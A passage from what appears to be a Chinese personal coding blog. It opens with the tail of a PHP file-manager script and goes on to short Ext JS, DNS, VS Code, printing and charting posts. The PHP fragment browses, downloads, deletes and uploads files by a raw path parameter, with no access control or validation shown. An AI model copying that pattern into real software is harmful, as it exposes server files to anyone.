$info[&#39;fullname&#39;]&#x3D;$fullName;</span><br><span class="line">		if(is_dir($path.&#39;&#x2F;&#39;.$fn))&#123;</span><br><span class="line">			$dirs[]&#x3D;$info;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			$files[]&#x3D;$info;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">	&lt;p&gt;&lt;a href&#x3D;&quot;?path&#x3D;&lt;?&#x3D;dirname($path)?&gt;&quot;&gt;返回上一级&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;</span><br><span class="line">	&lt;?php foreach($dirs as $v)&#123; ?&gt;</span><br><span class="line">	&lt;a href&#x3D;&quot;?path&#x3D;&lt;?&#x3D;$v[&#39;fullname&#39;]?&gt;&quot;&gt;&lt;?&#x3D;$v[&#39;fn&#39;]?&gt;&lt;&#x2F;a&gt;&lt;br&gt;</span><br><span class="line">	&lt;?php &#125;?&gt;</span><br><span class="line">	</span><br><span class="line">	&lt;?php foreach($files as $v)&#123;?&gt;</span><br><span class="line">	&lt;p&gt;&lt;?&#x3D;$v[&#39;fn&#39;]?&gt;　　　&lt;a href&#x3D;&quot;?action&#x3D;download&amp;fn&#x3D;&lt;?&#x3D;$v[&#39;fullname&#39;]?&gt;&quot;&gt;下载&lt;&#x2F;a&gt;　　　&lt;a href&#x3D;&quot;?action&#x3D;delete&amp;fn&#x3D;&lt;?&#x3D;$v[&#39;fullname&#39;]?&gt;&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;</span><br><span class="line">	&lt;?php &#125;?&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">		&lt;form action&#x3D;&quot;&lt;?php  echo pathinfo(__FILE__)[&#39;basename&#39;].&quot;?path&#x3D;$path&quot;;?&gt;&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot;&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;upload&quot;&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot; &gt;</span><br><span class="line">		&lt;&#x2F;form&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line"> &lt;&#x2F;body&gt;</span><br><span class="line">	</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/05/07/%E4%B8%80%E4%B8%AAExt%20JS%206%E5%8F%AF%E7%94%A8%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%B1%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/blog/images/avatar.gif">
      <meta itemprop="name" content="chaofml">
      <meta itemprop="description" content="思绪偶尔会在这里停留">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="超凡魔力">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/blog/2019/05/07/%E4%B8%80%E4%B8%AAExt%20JS%206%E5%8F%AF%E7%94%A8%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%B1%BB/" class="post-title-link" itemprop="url">一个Ext JS 6可用的下载类</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-05-07 12:12:00" itemprop="dateCreated datePublished" datetime="2019-05-07T12:12:00+08:00">2019-05-07</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-12-21 16:54:58" itemprop="dateModified" datetime="2020-12-21T16:54:58+08:00">2020-12-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="一个Ext-JS-6可用的下载类"><a href="#一个Ext-JS-6可用的下载类" class="headerlink" title="一个Ext JS 6可用的下载类"></a>一个Ext JS 6可用的下载类</h1><p>HTML5为A标签添加了download属性，可用来指定链接的文件名，单击A标签后就可实现文件下载功能，该组件就是利用这个特性来实现的，具体代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Ext.define(<span class="string">&#x27;Admin.util.Download&#x27;</span>, &#123;</span><br><span class="line">    alternateClassName: <span class="string">&#x27;DL&#x27;</span>,</span><br><span class="line">    singleton: <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">    saveAs: <span class="function"><span class="keyword">function</span>(<span class="params">url,filename, fileType, params</span>)</span>&#123;</span><br><span class="line">        Ext.Ajax.request(&#123;</span><br><span class="line">            method: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            url: url,</span><br><span class="line">            params: params,</span><br><span class="line">            filename: filename,</span><br><span class="line">            binary: <span class="literal">true</span>,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span>(<span class="params">response, options</span>)</span>&#123;</span><br><span class="line">                Ext.Msg.hide();</span><br><span class="line">                <span class="keyword">let</span> filename= options.filename,</span><br><span class="line">                    bytes = response.responseBytes,</span><br><span class="line">                    blob = <span class="keyword">new</span> Blob([bytes], &#123;<span class="attr">type</span>:fileType&#125;);</span><br><span class="line">                    a = <span class="built_in">document</span>.createElement(<span class="string">&quot;a&quot;</span>),</span><br><span class="line">                    evt = <span class="built_in">document</span>.createEvent(<span class="string">&quot;MouseEvents&quot;</span>);</span><br><span class="line">                a.innerHTML = filename;</span><br><span class="line">                a.download = filename;                    </span><br><span class="line">                a.href = URL.createObjectURL(blob);</span><br><span class="line">                evt.initEvent(<span class="string">&quot;click&quot;</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">                a.dispatchEvent(evt);        </span><br><span class="line">            &#125;,</span><br><span class="line">            failure: FAILED.ajax</span><br><span class="line">        &#125;) </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>下载类Admin.util.Download为单例模式的列，也就是不需要实例化就可直接调用saveSa方法，如果不喜欢使用单例模式，也可将saveAs方法修改为静态方法。</p>
<p>调用saveAs方法需要传递文件名（filename）、文件类型（fileType）和提交参数(params)这三个参数。</p>
<p>在saveAs方法内，会调用Ajax去获取下载文件。要注意的是，在调用Ajax时，将数据返回格式设置为了二进制格式（binary: true）。在成功获取文件后，就可使用响应的responseBytes属性来获取返回的字节流，然后将字节流转换为blob对象，这里要注意是必须设置好文件类型，不然下载后的文件可能是非预期的。在创建blob对象后，就可创建一个A标签了。在创建A标签时，需要绑定它的鼠标事件和innerHtml等属性，而最关键就是将下载的文件名绑定到download属性，并为blob对象创建一个访问地址赋值给A标签的href属性。最后就是调用A标签的单击事件来实现文件下载操作了。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/05/07/%E4%B8%8D%E7%A1%AE%E5%AE%9A%E5%B1%82%E6%95%B0%E7%9A%84%E5%B5%8C%E5%A5%97%E5%BE%AA%E7%8E%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/blog/images/avatar.gif">
      <meta itemprop="name" content="chaofml">
      <meta itemprop="description" content="思绪偶尔会在这里停留">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="超凡魔力">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/blog/2019/05/07/%E4%B8%8D%E7%A1%AE%E5%AE%9A%E5%B1%82%E6%95%B0%E7%9A%84%E5%B5%8C%E5%A5%97%E5%BE%AA%E7%8E%AF/" class="post-title-link" itemprop="url">不确定层数的嵌套循环</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-05-07 12:12:00" itemprop="dateCreated datePublished" datetime="2019-05-07T12:12:00+08:00">2019-05-07</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-03-17 11:42:22" itemprop="dateModified" datetime="2022-03-17T11:42:22+08:00">2022-03-17</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>[TOC]</p>
<h1 id="不确定层数的嵌套循环"><a href="#不确定层数的嵌套循环" class="headerlink" title="不确定层数的嵌套循环"></a>不确定层数的嵌套循环</h1><h2 id="1、多层循环，铺平。"><a href="#1、多层循环，铺平。" class="headerlink" title="1、多层循环，铺平。"></a>1、多层循环，铺平。</h2><blockquote>
<p>结果发现，其实我要实现的就是一个迭代器而已。我想在python里面应该有相应的成熟的方法。而我现在还在这…………重复造轮子。而且写这个代码，用了很长时间</p>
</blockquote>
<h3 id="简单的思路"><a href="#简单的思路" class="headerlink" title="简单的思路"></a>简单的思路</h3><blockquote>
<p>想自定义一个对象，然后将相关的方法，封装在里面。结果写了一点，发现不是个好思路。还要考虑对象的初始化问题。js里面的对象，尤其是继承，用起来比较麻烦。所以，放弃了这种思路。</p>
</blockquote>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/blog/2019/05/07/%E4%B8%8D%E7%A1%AE%E5%AE%9A%E5%B1%82%E6%95%B0%E7%9A%84%E5%B5%8C%E5%A5%97%E5%BE%AA%E7%8E%AF/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/05/07/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/blog/images/avatar.gif">
      <meta itemprop="name" content="chaofml">
      <meta itemprop="description" content="思绪偶尔会在这里停留">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="超凡魔力">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/blog/2019/05/07/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/" class="post-title-link" itemprop="url">域名解析</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-05-07 12:12:00" itemprop="dateCreated datePublished" datetime="2019-05-07T12:12:00+08:00">2019-05-07</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-12-21 16:54:58" itemprop="dateModified" datetime="2020-12-21T16:54:58+08:00">2020-12-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>#　域名解析</p>
<h2 id="记录类型"><a href="#记录类型" class="headerlink" title="记录类型"></a>记录类型</h2><p>常用的大概有：</p>
<h3 id="A记录"><a href="#A记录" class="headerlink" title="A记录"></a>A记录</h3><p>A解析到一个ip上。这个是常用的方式。</p>
<p>如果有一个ip地址，那么应增加两个A记录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;配置1  指定www开头</span><br><span class="line">记录类型：A</span><br><span class="line">主机记录：www  记录值：47.94.172.200</span><br><span class="line">解析线路：默认</span><br><span class="line">&#x2F;&#x2F;配置2，默认省略www也能访问</span><br><span class="line">记录类型：A</span><br><span class="line">主机记录：@    记录值：47.94.172.200</span><br><span class="line">解析线路：默认</span><br><span class="line">&#x2F;&#x2F;配置3  以git前缀访问</span><br><span class="line">记录类型：A</span><br><span class="line">主机记录：git    记录值：47.94.172.200</span><br><span class="line">解析线路：默认</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CNAME记录"><a href="#CNAME记录" class="headerlink" title="CNAME记录"></a>CNAME记录</h3><p>将此记录指向另外一个域名。</p>
<blockquote>
<p>主机记录，即域名以什么开头。</p>
<p>记录值 ，指向另外一个域名 test.coding.me</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;配置  执行另外一个域名</span><br><span class="line">记录类型：CNAME</span><br><span class="line">主机记录：m   记录值：test.coding.me</span><br><span class="line">解析线路：默认</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/05/07/%E5%B8%B8%E7%94%A8%E7%9A%84vs%E6%89%A9%E5%B1%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/blog/images/avatar.gif">
      <meta itemprop="name" content="chaofml">
      <meta itemprop="description" content="思绪偶尔会在这里停留">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="超凡魔力">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/blog/2019/05/07/%E5%B8%B8%E7%94%A8%E7%9A%84vs%E6%89%A9%E5%B1%95/" class="post-title-link" itemprop="url">常用的vs扩展</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-05-07 12:12:00" itemprop="dateCreated datePublished" datetime="2019-05-07T12:12:00+08:00">2019-05-07</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-12-21 16:54:58" itemprop="dateModified" datetime="2020-12-21T16:54:58+08:00">2020-12-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="常用的vs扩展"><a href="#常用的vs扩展" class="headerlink" title="常用的vs扩展"></a>常用的vs扩展</h1><ul>
<li><p>Chinese (Simplified) Language Pak</p>
<p>中文简体包</p>
</li>
<li><p>Git History Diff   (HuiZhou)</p>
<p>非常方便的代码Git历史查看，能方便的查看到之前的版本。</p>
</li>
<li><p>Code Runner 0.9.11  (Jun Han)</p>
<p>能快速的运行各种格式的代码，非常方便</p>
</li>
<li><p>dx-snippet </p>
<p>各种前端的快捷方式，（研究如何增加自己的快捷方式）</p>
</li>
<li><p>jshint 0.10.20  </p>
<p>js语法检查工具，需要npm isntall -g全局才能安装使用。</p>
</li>
<li><p>Material Theme 29.2.0</p>
<p>一个主题插件</p>
</li>
<li><p>PHP IntelliSense 2.3.10</p>
<p>PHP语法检查工具，具体不清楚。</p>
</li>
<li><p>Vetur </p>
<p>vue的工具</p>
</li>
<li><p>Coffee Emmet Mithril</p>
<p>Coffee的语法提示工具</p>
</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/05/07/%E6%89%93%E5%8D%B0%E8%BE%93%E5%87%BA%EF%BC%88%E6%89%93%E5%BC%80%E4%B8%80%E4%B8%AA%E6%96%B0%E9%A1%B5%E9%9D%A2%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/blog/images/avatar.gif">
      <meta itemprop="name" content="chaofml">
      <meta itemprop="description" content="思绪偶尔会在这里停留">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="超凡魔力">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/blog/2019/05/07/%E6%89%93%E5%8D%B0%E8%BE%93%E5%87%BA%EF%BC%88%E6%89%93%E5%BC%80%E4%B8%80%E4%B8%AA%E6%96%B0%E9%A1%B5%E9%9D%A2%EF%BC%89/" class="post-title-link" itemprop="url">打印输出</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-05-07 12:12:00" itemprop="dateCreated datePublished" datetime="2019-05-07T12:12:00+08:00">2019-05-07</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-12-21 16:54:58" itemprop="dateModified" datetime="2020-12-21T16:54:58+08:00">2020-12-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="打印输出"><a href="#打印输出" class="headerlink" title="打印输出"></a>打印输出</h1><blockquote>
<p>今天接到一个奇葩的工作，要求打印出清单。我的想法是，直接生成一个html，然后打印。打开一个新页面使用window.open，但是打开了之后，内容如何传递过去呢？网上找到了答案。</p>
</blockquote>
<h2 id="相关参考"><a href="#相关参考" class="headerlink" title="相关参考"></a>相关参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/shenba/archive/2009/08/16/1547429.html">参考1</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhouwenhong/p/3891212.html">参考2</a></p>
<p>下面的示例，演示了xtemplate、window.open的用法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">var newWin &#x3D; window.open();</span><br><span class="line"></span><br><span class="line">var tpl &#x3D; new Ext.XTemplate(</span><br><span class="line">	&#39;&lt;html&gt;&#39;,</span><br><span class="line">	&#39;&lt;head&gt;&#39;,</span><br><span class="line">	&#39;&lt;title&gt;&#123;meeting_name&#125;-预约费用清单&lt;&#x2F;title&gt;&#39;,</span><br><span class="line">	&#39;&lt;style&gt;&#39;,</span><br><span class="line">		&#39;body&#123;background: #eee;&#125;&#39;,</span><br><span class="line">		&#39;table&#123;width: 900px;text-align: center;margin: 0 auto;font-size: 18px;line-height: 35px;    border-collapse: collapse;&#125; &#39;,</span><br><span class="line">		&#39;.container&#123;width: 900px;height:1200px;  margin: 0 auto;   padding: 40px;background: white;&#125;&#39;,</span><br><span class="line">		&#39;.bottom div&#123;width: 32%;display: inline-block;font-size: 20px;padding: 20px 0;&#125;&#39;,</span><br><span class="line">		&#39;h1&#123;text-align: center;&#125;&#39;,</span><br><span class="line">	&#39;&lt;&#x2F;style&gt;&#39;,</span><br><span class="line">	&#39;&lt;&#x2F;head&gt;&#39;,</span><br><span class="line">	&#39;&lt;body&gt;&#39;,</span><br><span class="line">	&#39;&lt;div class&#x3D;&quot;container&quot;&gt;&#39;,</span><br><span class="line">		&#39;&lt;h1&gt;预约费用清单&lt;&#x2F;h1&gt;&#39;,</span><br><span class="line">		&#39;&lt;table border&#x3D;&quot;1&quot;&gt;&#39;,</span><br><span class="line">			&#39;&lt;tr&gt;&#39;,</span><br><span class="line">				&#39;&lt;th&gt;序号&lt;&#x2F;th&gt;&#39;,</span><br><span class="line">				&#39;&lt;th&gt;单品&lt;&#x2F;th&gt;&#39;,</span><br><span class="line">				&#39;&lt;th&gt;单价&lt;&#x2F;th&gt;&#39;,</span><br><span class="line">				&#39;&lt;th&gt;数量&lt;&#x2F;th&gt;&#39;,</span><br><span class="line">				&#39;&lt;th&gt;总价&lt;&#x2F;th&gt;&#39;,</span><br><span class="line">			&#39;&lt;&#x2F;tr&gt;&#39;,</span><br><span class="line">			&#39;&lt;tpl for&#x3D;&quot;commodity_id_list&quot;&gt;&#39;,</span><br><span class="line">			&#39;&lt;tr&gt;&#39;,</span><br><span class="line">				&#39;&lt;td&gt;&#123;#&#125;&lt;&#x2F;td&gt;&#39;,</span><br><span class="line">				&#39;&lt;td&gt;&#123;commodity_name&#125;&lt;&#x2F;td&gt;&#39;,</span><br><span class="line">				&#39;&lt;td&gt;￥&#123;commodity_price&#125;&lt;&#x2F;td&gt;&#39;,</span><br><span class="line">				&#39;&lt;td&gt;&#123;count&#125;&lt;&#x2F;td&gt;&#39;,</span><br><span class="line">				&#39;&lt;td&gt;￥&#123;total&#125;&lt;&#x2F;td&gt;&#39;,</span><br><span class="line">			&#39;&lt;&#x2F;tr&gt;&#39;,</span><br><span class="line">			&#39;&lt;&#x2F;tpl&gt;&#39;,</span><br><span class="line">			&#39;&lt;tr&gt;&#39;,</span><br><span class="line">				&#39;&lt;td colspan&#x3D;&quot;4&quot;&gt;合计&lt;&#x2F;td&gt;&#39;,</span><br><span class="line">				&#39;&lt;td&gt;￥&#123;meeting_cost_details&#125;&lt;&#x2F;td&gt;&#39;,</span><br><span class="line">			&#39;&lt;&#x2F;tr&gt;&#39;,</span><br><span class="line">		&#39;&lt;&#x2F;table&gt;&#39;,</span><br><span class="line">		&#39;&lt;div class&#x3D;&quot;bottom&quot;&gt;&#39;,</span><br><span class="line">			&#39;&lt;div&gt;预约方领导签字：&lt;&#x2F;div&gt;&#39;,</span><br><span class="line">			&#39;&lt;div&gt;管理方领导签字：&lt;&#x2F;div&gt;&#39;,</span><br><span class="line">			&#39;&lt;div&gt;主管领导签字：&lt;&#x2F;div&gt;&#39;,</span><br><span class="line">		&#39;&lt;&#x2F;div&gt;&#39;,</span><br><span class="line">	&#39;&lt;&#x2F;div&gt;&#39;,</span><br><span class="line">	&#39;&lt;&#x2F;body&gt;&#39;,</span><br><span class="line">	&#39;&lt;&#x2F;html&gt;&#39;</span><br><span class="line">);</span><br><span class="line">newWin.document.body.innerHTML &#x3D; tpl.apply(record.data);</span><br></pre></td></tr></table></figure>

<h1 id="兼容性问题"><a href="#兼容性问题" class="headerlink" title="兼容性问题"></a>兼容性问题</h1><p>var newWin = window.open();<br>将一段HTML代码，插入到一个页面中有三种方法：</p>
<ul>
<li>1）document.body.appendChild(yourCode)</li>
<li>2 ) document.body.innerHTML = yourCode</li>
<li>3 ) document.write(yourCode)</li>
</ul>
<p>使用newWin.doucment.body.appendChild(formElm )方法将表单元素插入到空页面，IE8下会报错Error:不支持此方法接口 ，而其它浏览器正常，因此选择另外两种方法了。</p>
<p>另外一种方式是，在window.open()的页面内，通过window.opener的方式与父页面进行数据通信。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/05/07/%E6%9F%B1%E7%8A%B6%E5%9B%BE%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/blog/images/avatar.gif">
      <meta itemprop="name" content="chaofml">
      <meta itemprop="description" content="思绪偶尔会在这里停留">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="超凡魔力">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/blog/2019/05/07/%E6%9F%B1%E7%8A%B6%E5%9B%BE%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">柱状图使用</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-05-07 12:12:00" itemprop="dateCreated datePublished" datetime="2019-05-07T12:12:00+08:00">2019-05-07</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-12-21 16:54:58" itemprop="dateModified" datetime="2020-12-21T16:54:58+08:00">2020-12-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>[TOC]</p>
<h1 id="柱状图使用"><a href="#柱状图使用" class="headerlink" title="柱状图使用"></a>柱状图使用</h1><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>具体的学习例子，见官方的sdk例子，地址：extjs/sdk/ext-6.5.3/build/examples/kitchensink/?classic#column-basic</p>
<p>简单粗暴，直接将其items（cartesian）复制过来，然后在其上面更改。将一些函数内的数具注释掉。刚开始，进可能的使用较少的功能。先将整个图显示出来再说。然后再深入每个配置项，调节功能。</p>
<h2 id="每项的参数分析"><a href="#每项的参数分析" class="headerlink" title="每项的参数分析"></a>每项的参数分析</h2><h3 id="store"><a href="#store" class="headerlink" title="store"></a>store</h3><p>以date作为x轴，注意2019-01-01重复了，实际上，同名的，只有最后一个起作用。但是数字，显示，两个都会显示。具体见图。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data:[</span><br><span class="line">	&#123;&#39;date&#39;:&#39;2019-07-01&#39;,&#39;basehospital&#39;:&#39;华山医院&#39;,&#39;price&#39;:&#39;11&#39;,&#39;count&#39;:&#39;1&#39;&#125;,</span><br><span class="line">	&#123;&#39;date&#39;:&#39;2019-07-01&#39;,&#39;basehospital&#39;:&#39;华山医院&#39;,&#39;price&#39;:&#39;13&#39;,&#39;count&#39;:&#39;1&#39;&#125;,</span><br><span class="line">	&#123;&#39;date&#39;:&#39;2019-07-02&#39;,&#39;basehospital&#39;:&#39;华山医院&#39;,&#39;price&#39;:&#39;22&#39;,&#39;count&#39;:&#39;1&#39;&#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p><img src="img/1562227106896.png" alt="1562227106896"></p>
<h3 id="axes"><a href="#axes" class="headerlink" title="axes"></a>axes</h3><p>设置横轴、纵轴。<a target="_blank" rel="noopener" href="https://chaofml.gitee.io/extjs/doc/extjs/6.5.3/classic/src/Axis.js.html">Ext.chart.axis.Axis</a> xtype: axis的一个实例</p>
